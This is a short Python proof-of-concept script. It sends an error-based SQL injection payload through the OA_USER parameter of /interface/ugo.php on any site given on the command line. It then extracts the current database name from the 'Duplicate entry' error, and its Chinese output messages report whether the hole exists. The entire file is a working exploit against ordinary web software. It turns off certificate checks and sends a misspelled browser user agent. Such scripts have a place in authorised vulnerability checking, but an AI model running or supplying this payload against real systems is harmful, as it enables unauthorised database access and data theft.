#!/usr/bin/env python3
#-*- coding: utf-8 -*-
#author: myh0st@xazlsec

import requests
import urllib3
import sys
import time
import json
import re
from datetime import datetime, timedelta

urllib3.disable_warnings()

def verify(site):
    patt  = "Duplicate entry '([\w_-]+)|1' for key"
    burp0_url = site + "/interface/ugo.php?OA_USER=a%2527%20and%201=(select%201%20from(select%20count(*),concat((select%20database()),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20%25271%2527=%25271"
    burp0_headers = {"User-Agent": "Moziilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) ", "Connection": "close", "Accept-Encoding": "gzip"}
    r = requests.get(burp0_url, headers=burp0_headers, verify=False)
    if "Duplicate" in r.text:
        return re.findall(patt, r.text)[0]
    return ""
    
if __name__=="__main__":
    target = sys.argv[1]
    info = verify(target)
    if info != "":
        print("[+]漏洞存在，查询当前数据库的名称为：", info)
    else:
        print("[-]漏洞不存在")
